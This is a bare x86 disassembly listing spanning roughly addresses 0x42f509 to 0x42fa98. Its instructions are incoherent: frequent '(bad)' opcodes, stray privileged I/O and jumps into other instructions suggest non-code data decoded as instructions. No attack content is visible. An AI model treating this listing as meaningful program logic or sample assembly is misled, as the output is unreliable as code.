  42f509:	21 6b 01             	and    %ebp,0x1(%ebx)
  42f50c:	69 6e 04 85 b6 38 b6 	imul   $0xb638b685,0x4(%esi),%ebp
  42f513:	15 36 9b ba 33       	adc    $0x33ba9b36,%eax
  42f518:	f8                   	clc
  42f519:	62 9d 7b 7d 72 6e    	bound  %ebx,0x6e727d7b(%ebp)
  42f51f:	18 5a 1d             	sbb    %bl,0x1d(%edx)
  42f522:	a2 8b db de c3       	mov    %al,0xc3dedb8b
  42f527:	7d 36                	jge    0x42f55f
  42f529:	cc                   	int3
  42f52a:	aa                   	stos   %al,%es:(%edi)
  42f52b:	d1 39                	sarl   $1,(%ecx)
  42f52d:	4c                   	dec    %esp
  42f52e:	41                   	inc    %ecx
  42f52f:	ef                   	out    %eax,(%dx)
  42f530:	f4                   	hlt
  42f531:	7a b6                	jp     0x42f4e9
  42f533:	3f                   	aas
  42f534:	40                   	inc    %eax
  42f535:	e6 5f                	out    %al,$0x5f
  42f537:	6e                   	outsb  %ds:(%esi),(%dx)
  42f538:	fa                   	cli
  42f539:	7f 06                	jg     0x42f541
  42f53b:	cf                   	iret
  42f53c:	0d 21 c4 5b 31       	or     $0x315bc421,%eax
  42f541:	da 88 b4 84 6a b9    	fimull -0x46957b4c(%eax)
  42f547:	41                   	inc    %ecx
  42f548:	a9 4b af a6 4b       	test   $0x4ba6af4b,%eax
  42f54d:	26 b5 fa             	es mov $0xfa,%ch
  42f550:	75 7f                	jne    0x42f5d1
  42f552:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42f553:	43                   	inc    %ebx
  42f554:	d1 29                	shrl   $1,(%ecx)
  42f556:	6e                   	outsb  %ds:(%esi),(%dx)
  42f557:	ca ce b4             	lret   $0xb4ce
  42f55a:	f6 41 ff d4          	testb  $0xd4,-0x1(%ecx)
  42f55e:	9b                   	fwait
  42f55f:	af                   	scas   %es:(%edi),%eax
  42f560:	4f                   	dec    %edi
  42f561:	ae                   	scas   %es:(%edi),%al
  42f562:	c1 e2 13             	shl    $0x13,%edx
  42f565:	2f                   	das
  42f566:	27                   	daa
  42f567:	8b 2b                	mov    (%ebx),%ebp
  42f569:	e9 8b bb 76 2c       	jmp    0x2cb9b0f9
  42f56e:	7f fc                	jg     0x42f56c
  42f570:	25 44 fc 29 c8       	and    $0xc829fc44,%eax
  42f575:	80 ab 43 55 03 0e 4d 	subb   $0x4d,0xe035543(%ebx)
  42f57c:	e3 5e                	jecxz  0x42f5dc
  42f57e:	0f 79 ae 8b 65 42 1d 	vmwrite 0x1d42658b(%esi),%ebp
  42f585:	92                   	xchg   %eax,%edx
  42f586:	f7 11                	notl   (%ecx)
  42f588:	7d 5e                	jge    0x42f5e8
  42f58a:	26 c7 c2 91 4b 9c 29 	es mov $0x299c4b91,%edx
  42f591:	1d b6 8c 8e ce       	sbb    $0xce8e8cb6,%eax
  42f596:	60                   	pusha
  42f597:	60                   	pusha
  42f598:	7c 55                	jl     0x42f5ef
  42f59a:	78 83                	js     0x42f51f
  42f59c:	4a                   	dec    %edx
  42f59d:	a8 b8                	test   $0xb8,%al
  42f59f:	3b 2f                	cmp    (%edi),%ebp
  42f5a1:	05 72 3d 4f ac       	add    $0xac4f3d72,%eax
  42f5a6:	4e                   	dec    %esi
  42f5a7:	66 05 8e fe          	add    $0xfe8e,%ax
  42f5ab:	ff 18                	lcall  *(%eax)
  42f5ad:	e6 9d                	out    %al,$0x9d
  42f5af:	80 bd b5 8a ed 2b 19 	cmpb   $0x19,0x2bed8ab5(%ebp)
  42f5b6:	56                   	push   %esi
  42f5b7:	06                   	push   %es
  42f5b8:	5f                   	pop    %edi
  42f5b9:	06                   	push   %es
  42f5ba:	85 3f                	test   %edi,(%edi)
  42f5bc:	82 2d 21 08 cb 24 f6 	subb   $0xf6,0x24cb0821
  42f5c3:	7e 86                	jle    0x42f54b
  42f5c5:	b1 17                	mov    $0x17,%cl
  42f5c7:	7f 39                	jg     0x42f602
  42f5c9:	5a                   	pop    %edx
  42f5ca:	32 94 d3 bf ee af c5 	xor    -0x3a501141(%ebx,%edx,8),%dl
  42f5d1:	ee                   	out    %al,(%dx)
  42f5d2:	7b 8a                	jnp    0x42f55e
  42f5d4:	fd                   	std
  42f5d5:	7d f7                	jge    0x42f5ce
  42f5d7:	0b cb                	or     %ebx,%ecx
  42f5d9:	38 b7 15 56 bd 50    	cmp    %dh,0x50bd5615(%edi)
  42f5df:	e1 d4                	loope  0x42f5b5
  42f5e1:	e0 16                	loopne 0x42f5f9
  42f5e3:	f3 cb                	repz lret
  42f5e5:	6e                   	outsb  %ds:(%esi),(%dx)
  42f5e6:	56                   	push   %esi
  42f5e7:	bd 29 36 21 13       	mov    $0x13213629,%ebp
  42f5ec:	a0 1c e8 44 c5       	mov    0xc544e81c,%al
  42f5f1:	48                   	dec    %eax
  42f5f2:	3c 3f                	cmp    $0x3f,%al
  42f5f4:	24 c0                	and    $0xc0,%al
  42f5f6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42f5f7:	23 66 7b             	and    0x7b(%esi),%esp
  42f5fa:	3a 36                	cmp    (%esi),%dh
  42f5fc:	e9 06 3d 0e c7       	jmp    0xc7513307
  42f601:	80 69 5b ae          	subb   $0xae,0x5b(%ecx)
  42f605:	c2 ed 58             	ret    $0x58ed
  42f608:	9e                   	sahf
  42f609:	cd a4                	int    $0xa4
  42f60b:	49                   	dec    %ecx
  42f60c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42f60d:	1f                   	pop    %ds
  42f60e:	17                   	pop    %ss
  42f60f:	c3                   	ret
  42f610:	0c 27                	or     $0x27,%al
  42f612:	76 b5                	jbe    0x42f5c9
  42f614:	69 d5 a6 0d df 9a    	imul   $0x9adf0da6,%ebp,%edx
  42f61a:	53                   	push   %ebx
  42f61b:	6f                   	outsl  %ds:(%esi),(%dx)
  42f61c:	8b 9d 7b 97 a2 97    	mov    -0x685d6885(%ebp),%ebx
  42f622:	cd 55                	int    $0x55
  42f624:	d7                   	xlat   %ds:(%ebx)
  42f625:	37                   	aaa
  42f626:	7e 6d                	jle    0x42f695
  42f628:	d3 1c fa             	rcrl   %cl,(%edx,%edi,8)
  42f62b:	a9 ad 8e ba 15       	test   $0x15ba8ead,%eax
  42f630:	a8 18                	test   $0x18,%al
  42f632:	21 19                	and    %ebx,(%ecx)
  42f634:	2f                   	das
  42f635:	f8                   	clc
  42f636:	2b b7 11 de 80 48    	sub    0x4880de11(%edi),%esi
  42f63c:	26 a0 9a 7e a7 2f    	mov    %es:0x2fa77e9a,%al
  42f642:	86 c1                	xchg   %al,%cl
  42f644:	e7 85                	out    %eax,$0x85
  42f646:	64 6e                	outsb  %fs:(%esi),(%dx)
  42f648:	2c 7a                	sub    $0x7a,%al
  42f64a:	c3                   	ret
  42f64b:	ed                   	in     (%dx),%eax
  42f64c:	bb 23 fe 86 73       	mov    $0x7386fe23,%ebx
  42f651:	47                   	inc    %edi
  42f652:	a3 d3 61 99 f9       	mov    %eax,0xf99961d3
  42f657:	0a e7                	or     %bh,%ah
  42f659:	73 aa                	jae    0x42f605
  42f65b:	f8                   	clc
  42f65c:	f0 15 da c8 d0 09    	lock adc $0x9d0c8da,%eax
  42f662:	fd                   	std
  42f663:	70 31                	jo     0x42f696
  42f665:	ed                   	in     (%dx),%eax
  42f666:	69 9f e2 89 4b 7d ca 	imul   $0xe469d8ca,0x7d4b89e2(%edi),%ebx
  42f66d:	d8 69 e4 
  42f670:	4e                   	dec    %esi
  42f671:	db c5                	fcmovnb %st(5),%st
  42f673:	8d 06                	lea    (%esi),%eax
  42f675:	4b                   	dec    %ebx
  42f676:	67 9c                	addr16 pushf
  42f678:	aa                   	stos   %al,%es:(%edi)
  42f679:	fe 0b                	decb   (%ebx)
  42f67b:	12 93 94 ab ed 53    	adc    0x53edab94(%ebx),%dl
  42f681:	19 a2 cc 5c d1 59    	sbb    %esp,0x59d15ccc(%edx)
  42f687:	a3 fb 52 94 cf       	mov    %eax,0xcf9452fb
  42f68c:	bc cd 98 4d f8       	mov    $0xf84d98cd,%esp
  42f691:	d0 48 8b             	rorb   $1,-0x75(%eax)
  42f694:	e1 ae                	loope  0x42f644
  42f696:	0a 6a 51             	or     0x51(%edx),%ch
  42f699:	3e 2c fa             	ds sub $0xfa,%al
  42f69c:	d3 17                	rcll   %cl,(%edi)
  42f69e:	2d 85 c3 86 75       	sub    $0x7586c385,%eax
  42f6a3:	0d f4 99 ff f4       	or     $0xf4ff99f4,%eax
  42f6a8:	29 79 b7             	sub    %edi,-0x49(%ecx)
  42f6ab:	89 b6 38 38 87 a6    	mov    %esi,-0x5978c7c8(%esi)
  42f6b1:	67 62 aa ea ea       	bound  %ebp,-0x1516(%bp,%si)
  42f6b6:	0e                   	push   %cs
  42f6b7:	e0 d6                	loopne 0x42f68f
  42f6b9:	49                   	dec    %ecx
  42f6ba:	57                   	push   %edi
  42f6bb:	b9 d2 1a 6c 1d       	mov    $0x1d6c1ad2,%ecx
  42f6c0:	87 e5                	xchg   %esp,%ebp
  42f6c2:	40                   	inc    %eax
  42f6c3:	cc                   	int3
  42f6c4:	5c                   	pop    %esp
  42f6c5:	44                   	inc    %esp
  42f6c6:	be e0 76 7d cf       	mov    $0xcf7d76e0,%esi
  42f6cb:	c9                   	leave
  42f6cc:	3b c6                	cmp    %esi,%eax
  42f6ce:	4e                   	dec    %esi
  42f6cf:	30 f6                	xor    %dh,%dh
  42f6d1:	c1 c8 73             	ror    $0x73,%eax
  42f6d4:	cd 0b                	int    $0xb
  42f6d6:	68 01 a7 2c 2e       	push   $0x2e2ca701
  42f6db:	35 08 62 a7 a8       	xor    $0xa8a76208,%eax
  42f6e0:	39 9f f8 aa 95 c8    	cmp    %ebx,-0x376a5508(%edi)
  42f6e6:	a0 54 cb 43 f6       	mov    0xf643cb54,%al
  42f6eb:	07                   	pop    %es
  42f6ec:	0c 29                	or     $0x29,%al
  42f6ee:	eb 44                	jmp    0x42f734
  42f6f0:	cc                   	int3
  42f6f1:	d1 53 14             	rcll   $1,0x14(%ebx)
  42f6f4:	ea c0 d4 a8 e7 6c c7 	ljmp   $0xc76c,$0xe7a8d4c0
  42f6fb:	bd b7 7d db 70       	mov    $0x70db7db7,%ebp
  42f700:	b9 e8 8f 94 6f       	mov    $0x6f948fe8,%ecx
  42f705:	4a                   	dec    %edx
  42f706:	32 77 ed             	xor    -0x13(%edi),%dh
  42f709:	54                   	push   %esp
  42f70a:	b7 08                	mov    $0x8,%bh
  42f70c:	14 8c                	adc    $0x8c,%al
  42f70e:	39 66 07             	cmp    %esp,0x7(%esi)
  42f711:	c5 86 31 f0 b3 cf    	lds    -0x304c0fcf(%esi),%eax
  42f717:	0a aa 84 12 a3 d6    	or     -0x295ced7c(%edx),%ch
  42f71d:	aa                   	stos   %al,%es:(%edi)
  42f71e:	5b                   	pop    %ebx
  42f71f:	04 1e                	add    $0x1e,%al
  42f721:	79 1f                	jns    0x42f742
  42f723:	55                   	push   %ebp
  42f724:	ce                   	into
  42f725:	e0 ff                	loopne 0x42f726
  42f727:	32 1f                	xor    (%edi),%bl
  42f729:	b9 b3 30 6a 0d       	mov    $0xd6a30b3,%ecx
  42f72e:	1e                   	push   %ds
  42f72f:	08 11                	or     %dl,(%ecx)
  42f731:	c2 8f fa             	ret    $0xfa8f
  42f734:	46                   	inc    %esi
  42f735:	8d                   	lea    (bad),%eax
  42f736:	c7                   	(bad)
  42f737:	c8 a4 62 be          	enter  $0x62a4,$0xbe
  42f73b:	47                   	inc    %edi
  42f73c:	46                   	inc    %esi
  42f73d:	df 1c e5 33 43 9f 74 	fistps 0x749f4333(,%eiz,8)
  42f744:	4d                   	dec    %ebp
  42f745:	13 4c 67 a6          	adc    -0x5a(%edi,%eiz,2),%ecx
  42f749:	d2 c3                	rol    %cl,%bl
  42f74b:	c0 22 b4             	shlb   $0xb4,(%edx)
  42f74e:	88 02                	mov    %al,(%edx)
  42f750:	56                   	push   %esi
  42f751:	85 af 3f fc 40 e2    	test   %ebp,-0x1dbf03c1(%edi)
  42f757:	cc                   	int3
  42f758:	3f                   	aas
  42f759:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f75a:	f2 0c ef             	repnz or $0xef,%al
  42f75d:	84 1f                	test   %bl,(%edi)
  42f75f:	63 b6 6b 73 e0 f5    	arpl   %esi,-0xa1f8c95(%esi)
  42f765:	8c 01                	mov    %es,(%ecx)
  42f767:	eb e7                	jmp    0x42f750
  42f769:	b9 d1 c4 15 10       	mov    $0x1015c4d1,%ecx
  42f76e:	41                   	inc    %ecx
  42f76f:	f9                   	stc
  42f770:	14 28                	adc    $0x28,%al
  42f772:	00 07                	add    %al,(%edi)
  42f774:	ae                   	scas   %es:(%edi),%al
  42f775:	ec                   	in     (%dx),%al
  42f776:	7b d0                	jnp    0x42f748
  42f778:	1b 8b 88 a0 76 f9    	sbb    -0x6895f78(%ebx),%ecx
  42f77e:	0c 29                	or     $0x29,%al
  42f780:	41                   	inc    %ecx
  42f781:	e4 03                	in     $0x3,%al
  42f783:	fb                   	sti
  42f784:	36 b4 1e             	ss mov $0x1e,%ah
  42f787:	03 4d 06             	add    0x6(%ebp),%ecx
  42f78a:	0d b4 a6 84 7d       	or     $0x7d84a6b4,%eax
  42f78f:	70 70                	jo     0x42f801
  42f791:	72 b3                	jb     0x42f746
  42f793:	69 20 31 8f e4 ec    	imul   $0xece48f31,(%eax),%esp
  42f799:	4c                   	dec    %esp
  42f79a:	69 fc ad 86 d2 14    	imul   $0x14d286ad,%esp,%edi
  42f7a0:	1e                   	push   %ds
  42f7a1:	b3 e7                	mov    $0xe7,%bl
  42f7a3:	c9                   	leave
  42f7a4:	44                   	inc    %esp
  42f7a5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f7a6:	66 08 fd             	data16 or %bh,%ch
  42f7a9:	a9 30 29 d0 c0       	test   $0xc0d02930,%eax
  42f7ae:	1e                   	push   %ds
  42f7af:	f3 af                	repz scas %es:(%edi),%eax
  42f7b1:	2c 0a                	sub    $0xa,%al
  42f7b3:	69 a8 8c 26 d8 21 0a 	imul   $0x3ee5cd0a,0x21d8268c(%eax),%ebp
  42f7ba:	cd e5 3e 
  42f7bd:	e5 29                	in     $0x29,%eax
  42f7bf:	46                   	inc    %esi
  42f7c0:	80 ff 59             	cmp    $0x59,%bh
  42f7c3:	6f                   	outsl  %ds:(%esi),(%dx)
  42f7c4:	33 2d 89 6c 87 1e    	xor    0x1e876c89,%ebp
  42f7ca:	a0 2a c2 71 04       	mov    0x471c22a,%al
  42f7cf:	22 af 51 88 13 e5    	and    -0x1aec77af(%edi),%ch
  42f7d5:	3b d4                	cmp    %esp,%edx
  42f7d7:	8d                   	lea    (bad),%esp
  42f7d8:	e7 7c                	out    %eax,$0x7c
  42f7da:	e0 af                	loopne 0x42f78b
  42f7dc:	dc 56 8b             	fcoml  -0x75(%esi)
  42f7df:	e6 5b                	out    %al,$0x5b
  42f7e1:	87 84 76 a8 c9 ae d0 	xchg   %eax,-0x2f513658(%esi,%esi,2)
  42f7e8:	47                   	inc    %edi
  42f7e9:	26 c3                	es ret
  42f7eb:	c4                   	(bad)
  42f7ec:	cd c3                	int    $0xc3
  42f7ee:	39 a7 c2 ed 03 d5    	cmp    %esp,-0x2afc123e(%edi)
  42f7f4:	49                   	dec    %ecx
  42f7f5:	ee                   	out    %al,(%dx)
  42f7f6:	82 ee 07             	sub    $0x7,%dh
  42f7f9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  42f7fb:	14 eb                	adc    $0xeb,%al
  42f7fd:	0c e9                	or     $0xe9,%al
  42f7ff:	5e                   	pop    %esi
  42f800:	46                   	inc    %esi
  42f801:	ef                   	out    %eax,(%dx)
  42f802:	b1 69                	mov    $0x69,%cl
  42f804:	7d 7d                	jge    0x42f883
  42f806:	32 7b 4a             	xor    0x4a(%ebx),%bh
  42f809:	0c 11                	or     $0x11,%al
  42f80b:	cd f8                	int    $0xf8
  42f80d:	eb 15                	jmp    0x42f824
  42f80f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42f810:	e2 22                	loop   0x42f834
  42f812:	ff ae ab ef 16 74    	ljmp   *0x7416efab(%esi)
  42f818:	12 50 fa             	adc    -0x6(%eax),%dl
  42f81b:	b2 87                	mov    $0x87,%dl
  42f81d:	40                   	inc    %eax
  42f81e:	64 85 69 71          	test   %ebp,%fs:0x71(%ecx)
  42f822:	8c 4b da             	mov    %cs,-0x26(%ebx)
  42f825:	48                   	dec    %eax
  42f826:	15 d0 83 3c 3d       	adc    $0x3d3c83d0,%eax
  42f82b:	d1 89 3e d0 13 b9    	rorl   $1,-0x46ec2fc2(%ecx)
  42f831:	0f fc 7c c3 98       	paddb  -0x68(%ebx,%eax,8),%mm7
  42f836:	bd 2d 23 df 25       	mov    $0x25df232d,%ebp
  42f83b:	37                   	aaa
  42f83c:	cd 1e                	int    $0x1e
  42f83e:	1c 84                	sbb    $0x84,%al
  42f840:	03 c6                	add    %esi,%eax
  42f842:	63 df                	arpl   %ebx,%edi
  42f844:	da 8c f8 ff 7b 99 06 	fimull 0x6997bff(%eax,%edi,8)
  42f84b:	1a a6 3f 44 25 22    	sbb    0x2225443f(%esi),%ah
  42f851:	64 69 50 9c 5a 41 6e 	imul   $0xc56e415a,%fs:-0x64(%eax),%edx
  42f858:	c5 
  42f859:	75 ff                	jne    0x42f85a
  42f85b:	35 cf 19 73 7e       	xor    $0x7e7319cf,%eax
  42f860:	9c                   	pushf
  42f861:	ca 65 b1             	lret   $0xb165
  42f864:	e7 e6                	out    %eax,$0xe6
  42f866:	93                   	xchg   %eax,%ebx
  42f867:	8d 3d 7e 5e 02 42    	lea    0x42025e7e,%edi
  42f86d:	ea 75 7d 83 af 51 8f 	ljmp   $0x8f51,$0xaf837d75
  42f874:	67 99                	addr16 cltd
  42f876:	85 9f eb 86 14 b4    	test   %ebx,-0x4beb7915(%edi)
  42f87c:	29 71 c6             	sub    %esi,-0x3a(%ecx)
  42f87f:	51                   	push   %ecx
  42f880:	45                   	inc    %ebp
  42f881:	74 72                	je     0x42f8f5
  42f883:	8b 9a 38 a6 f7 e3    	mov    -0x1c0859c8(%edx),%ebx
  42f889:	2d 4b b6 22 4e       	sub    $0x4e22b64b,%eax
  42f88e:	cd 25                	int    $0x25
  42f890:	30 d5                	xor    %dl,%ch
  42f892:	94                   	xchg   %eax,%esp
  42f893:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f894:	5a                   	pop    %edx
  42f895:	38 27                	cmp    %ah,(%edi)
  42f897:	84 4d 19             	test   %cl,0x19(%ebp)
  42f89a:	94                   	xchg   %eax,%esp
  42f89b:	60                   	pusha
  42f89c:	28 80 30 72 9e f8    	sub    %al,-0x7618dd0(%eax)
  42f8a2:	6a 99                	push   $0xffffff99
  42f8a4:	8b 29                	mov    (%ecx),%ebp
  42f8a6:	73 9c                	jae    0x42f844
  42f8a8:	b2 b2                	mov    $0xb2,%dl
  42f8aa:	17                   	pop    %ss
  42f8ab:	c3                   	ret
  42f8ac:	57                   	push   %edi
  42f8ad:	d6                   	salc
  42f8ae:	d7                   	xlat   %ds:(%ebx)
  42f8af:	de 21                	fisubs (%ecx)
  42f8b1:	b1 36                	mov    $0x36,%cl
  42f8b3:	37                   	aaa
  42f8b4:	b8 48 a7 1c 7c       	mov    $0x7c1ca748,%eax
  42f8b9:	6a 8d                	push   $0xffffff8d
  42f8bb:	bc d0 d8 e1 e2       	mov    $0xe2e1d8d0,%esp
  42f8c0:	ff 81 ca d2 87 02    	incl   0x287d2ca(%ecx)
  42f8c6:	00 a1 0f 35 16 32    	add    %ah,0x3216350f(%ecx)
  42f8cc:	fe                   	(bad)
  42f8cd:	57                   	push   %edi
  42f8ce:	db 85 38 be b1 36    	fildl  0x36b1be38(%ebp)
  42f8d4:	95                   	xchg   %eax,%ebp
  42f8d5:	c7                   	(bad)
  42f8d6:	cb                   	lret
  42f8d7:	31 76 c2             	xor    %esi,-0x3e(%esi)
  42f8da:	25 ed eb 23 4c       	and    $0x4c23ebed,%eax
  42f8df:	3c 1a                	cmp    $0x1a,%al
  42f8e1:	54                   	push   %esp
  42f8e2:	90                   	nop
  42f8e3:	2f                   	das
  42f8e4:	b3 3a                	mov    $0x3a,%bl
  42f8e6:	4e                   	dec    %esi
  42f8e7:	16                   	push   %ss
  42f8e8:	1c 91                	sbb    $0x91,%al
  42f8ea:	91                   	xchg   %eax,%ecx
  42f8eb:	60                   	pusha
  42f8ec:	01 4a 19             	add    %ecx,0x19(%edx)
  42f8ef:	6c                   	insb   (%dx),%es:(%edi)
  42f8f0:	ce                   	into
  42f8f1:	35 cb 22 e8 a4       	xor    $0xa4e822cb,%eax
  42f8f6:	7d ba                	jge    0x42f8b2
  42f8f8:	1f                   	pop    %ds
  42f8f9:	62 a5 fe c7 76 43    	bound  %esp,0x4376c7fe(%ebp)
  42f8ff:	21 12                	and    %edx,(%edx)
  42f901:	4b                   	dec    %ebx
  42f902:	39 da                	cmp    %ebx,%edx
  42f904:	a8 48                	test   $0x48,%al
  42f906:	5b                   	pop    %ebx
  42f907:	9f                   	lahf
  42f908:	9e                   	sahf
  42f909:	b5 b2                	mov    $0xb2,%ch
  42f90b:	e8 45 c1 ab 72       	call   0x72eeba55
  42f910:	73 2f                	jae    0x42f941
  42f912:	05 1a be 8f 9c       	add    $0x9c8fbe1a,%eax
  42f917:	5c                   	pop    %esp
  42f918:	d0 71 f9             	shlb   $1,-0x7(%ecx)
  42f91b:	f9                   	stc
  42f91c:	43                   	inc    %ebx
  42f91d:	1e                   	push   %ds
  42f91e:	55                   	push   %ebp
  42f91f:	69 e7 89 f2 ef 38    	imul   $0x38eff289,%edi,%esp
  42f925:	e1 b4                	loope  0x42f8db
  42f927:	d8 34 b1             	fdivs  (%ecx,%esi,4)
  42f92a:	b7 81                	mov    $0x81,%bh
  42f92c:	15 c2 0e dc f8       	adc    $0xf8dc0ec2,%eax
  42f931:	8b 83 09 eb c8 f0    	mov    -0xf3714f7(%ebx),%eax
  42f937:	cf                   	iret
  42f938:	0e                   	push   %cs
  42f939:	97                   	xchg   %eax,%edi
  42f93a:	66 7e 68             	data16 jle 0x42f9a5
  42f93d:	56                   	push   %esi
  42f93e:	c3                   	ret
  42f93f:	ad                   	lods   %ds:(%esi),%eax
  42f940:	cd 3d                	int    $0x3d
  42f942:	5e                   	pop    %esi
  42f943:	df 8b b0 37 8a f1    	fisttps -0xe75c850(%ebx)
  42f949:	26 cd 8d             	es int $0x8d
  42f94c:	da 68 66             	fisubrl 0x66(%eax)
  42f94f:	d3 3b                	sarl   %cl,(%ebx)
  42f951:	87 b9 83 74 32 76    	xchg   %edi,0x76327483(%ecx)
  42f957:	f4                   	hlt
  42f958:	dd 0a                	fisttpll (%edx)
  42f95a:	75 55                	jne    0x42f9b1
  42f95c:	18 bb 11 a9 1a 09    	sbb    %bh,0x91aa911(%ebx)
  42f962:	4c                   	dec    %esp
  42f963:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42f964:	e3 d7                	jecxz  0x42f93d
  42f966:	9e                   	sahf
  42f967:	bb e5 25 49 d2       	mov    $0xd24925e5,%ebx
  42f96c:	32 41 76             	xor    0x76(%ecx),%al
  42f96f:	7f db                	jg     0x42f94c
  42f971:	b5 30                	mov    $0x30,%ch
  42f973:	f8                   	clc
  42f974:	b3 98                	mov    $0x98,%bl
  42f976:	fb                   	sti
  42f977:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42f978:	bd 25 38 47 68       	mov    $0x68473825,%ebp
  42f97d:	6e                   	outsb  %ds:(%esi),(%dx)
  42f97e:	47                   	inc    %edi
  42f97f:	00 4d 4c             	add    %cl,0x4c(%ebp)
  42f982:	94                   	xchg   %eax,%esp
  42f983:	41                   	inc    %ecx
  42f984:	df b4 fd 85 2d a5 45 	fbstp  0x45a52d85(%ebp,%edi,8)
  42f98b:	6f                   	outsl  %ds:(%esi),(%dx)
  42f98c:	7f 5b                	jg     0x42f9e9
  42f98e:	d3 fe                	sar    %cl,%esi
  42f990:	d3 e4                	shl    %cl,%esp
  42f992:	c7                   	(bad)
  42f993:	cc                   	int3
  42f994:	8d 8a 40 b9 45 0a    	lea    0xa45b940(%edx),%ecx
  42f99a:	63 38                	arpl   %edi,(%eax)
  42f99c:	ed                   	in     (%dx),%eax
  42f99d:	ab                   	stos   %eax,%es:(%edi)
  42f99e:	bd 03 0d 43 29       	mov    $0x29430d03,%ebp
  42f9a3:	47                   	inc    %edi
  42f9a4:	0f 04                	(bad)
  42f9a6:	2b e8                	sub    %eax,%ebp
  42f9a8:	fb                   	sti
  42f9a9:	c7                   	(bad)
  42f9aa:	88 11                	mov    %dl,(%ecx)
  42f9ac:	07                   	pop    %es
  42f9ad:	ea 5f 29 fe cd 84 a0 	ljmp   $0xa084,$0xcdfe295f
  42f9b4:	86 25 ff cc a3 71    	xchg   %ah,0x71a3ccff
  42f9ba:	3d f2 f4 35 a6       	cmp    $0xa635f4f2,%eax
  42f9bf:	17                   	pop    %ss
  42f9c0:	17                   	pop    %ss
  42f9c1:	f5                   	cmc
  42f9c2:	79 b2                	jns    0x42f976
  42f9c4:	af                   	scas   %es:(%edi),%eax
  42f9c5:	c3                   	ret
  42f9c6:	d3 da                	rcr    %cl,%edx
  42f9c8:	98                   	cwtl
  42f9c9:	5e                   	pop    %esi
  42f9ca:	3a cc                	cmp    %ah,%cl
  42f9cc:	e3 b2                	jecxz  0x42f980
  42f9ce:	a8 b0                	test   $0xb0,%al
  42f9d0:	a1 e1 7a 4c a5       	mov    0xa54c7ae1,%eax
  42f9d5:	cf                   	iret
  42f9d6:	4d                   	dec    %ebp
  42f9d7:	a9 af b4 ed 91       	test   $0x91edb4af,%eax
  42f9dc:	d3 c0                	rol    %cl,%eax
  42f9de:	fc                   	cld
  42f9df:	d1 8b 53 4b 5e 8b    	rorl   $1,-0x74a1b4ad(%ebx)
  42f9e5:	9e                   	sahf
  42f9e6:	b1 82                	mov    $0x82,%cl
  42f9e8:	df e6                	(bad)
  42f9ea:	34 eb                	xor    $0xeb,%al
  42f9ec:	71 d8                	jno    0x42f9c6
  42f9ee:	31 4f 24             	xor    %ecx,0x24(%edi)
  42f9f1:	db b4 e0 b7 ea d0 8a 	(bad) -0x752f1549(%eax,%eiz,8)
  42f9f8:	d2 c4                	rol    %cl,%ah
  42f9fa:	37                   	aaa
  42f9fb:	bc 09 e6 7e c4       	mov    $0xc47ee609,%esp
  42fa00:	79 cc                	jns    0x42f9ce
  42fa02:	b5 c8                	mov    $0xc8,%ch
  42fa04:	09 60 42             	or     %esp,0x42(%eax)
  42fa07:	b6 b5                	mov    $0xb5,%dh
  42fa09:	3a f0                	cmp    %al,%dh
  42fa0b:	76 1f                	jbe    0x42fa2c
  42fa0d:	9d                   	popf
  42fa0e:	5b                   	pop    %ebx
  42fa0f:	69 ab 9c a5 67 86 e8 	imul   $0x744c53e8,-0x79985a64(%ebx),%ebp
  42fa16:	53 4c 74 
  42fa19:	3b 63 4c             	cmp    0x4c(%ebx),%esp
  42fa1c:	65 d7                	xlat   %gs:(%ebx)
  42fa1e:	a0 91 32 12 ec       	mov    0xec123291,%al
  42fa23:	b0 74                	mov    $0x74,%al
  42fa25:	fb                   	sti
  42fa26:	79 be                	jns    0x42f9e6
  42fa28:	0d e3 e0 11 ec       	or     $0xec11e0e3,%eax
  42fa2d:	eb 42                	jmp    0x42fa71
  42fa2f:	b8 e4 ba a5 91       	mov    $0x91a5bae4,%eax
  42fa34:	7c 1e                	jl     0x42fa54
  42fa36:	dd b5 27 69 9a 07    	fnsave 0x79a6927(%ebp)
  42fa3c:	27                   	daa
  42fa3d:	00 fc                	add    %bh,%ah
  42fa3f:	ea 08 ca f6 32 54 9f 	ljmp   $0x9f54,$0x32f6ca08
  42fa46:	f5                   	cmc
  42fa47:	86 62 0e             	xchg   %ah,0xe(%edx)
  42fa4a:	5e                   	pop    %esi
  42fa4b:	32 dd                	xor    %ch,%bl
  42fa4d:	73 16                	jae    0x42fa65
  42fa4f:	21 24 82             	and    %esp,(%edx,%eax,4)
  42fa52:	8c cd                	mov    %cs,%ebp
  42fa54:	c9                   	leave
  42fa55:	ac                   	lods   %ds:(%esi),%al
  42fa56:	2f                   	das
  42fa57:	8e b8 ba 59 4c 50    	mov    0x504c59ba(%eax),%?
  42fa5d:	9b                   	fwait
  42fa5e:	d2 06                	rolb   %cl,(%esi)
  42fa60:	0c 7d                	or     $0x7d,%al
  42fa62:	cc                   	int3
  42fa63:	3c 61                	cmp    $0x61,%al
  42fa65:	c4                   	(bad)
  42fa66:	c0 bb 12 a3 8e 8b 79 	sarb   $0x79,-0x74715cee(%ebx)
  42fa6d:	8c 79 8f             	mov    %?,-0x71(%ecx)
  42fa70:	96                   	xchg   %eax,%esi
  42fa71:	fe                   	(bad)
  42fa72:	ab                   	stos   %eax,%es:(%edi)
  42fa73:	c2 11 e2             	ret    $0xe211
  42fa76:	57                   	push   %edi
  42fa77:	76 5d                	jbe    0x42fad6
  42fa79:	06                   	push   %es
  42fa7a:	e2 70                	loop   0x42faec
  42fa7c:	ee                   	out    %al,(%dx)
  42fa7d:	a2 93 7f 7e 7f       	mov    %al,0x7f7e7f93
  42fa82:	16                   	push   %ss
  42fa83:	73 16                	jae    0x42fa9b
  42fa85:	22 93 26 de e8 3a    	and    0x3ae8de26(%ebx),%dl
  42fa8b:	6c                   	insb   (%dx),%es:(%edi)
  42fa8c:	a9 cc e2 ee 29       	test   $0x29eee2cc,%eax
  42fa91:	0a 96 ef 94 78 9d    	or     -0x62876b11(%esi),%dl
  42fa97:	5a                   	pop    %edx
  42fa98:	2f                   	das
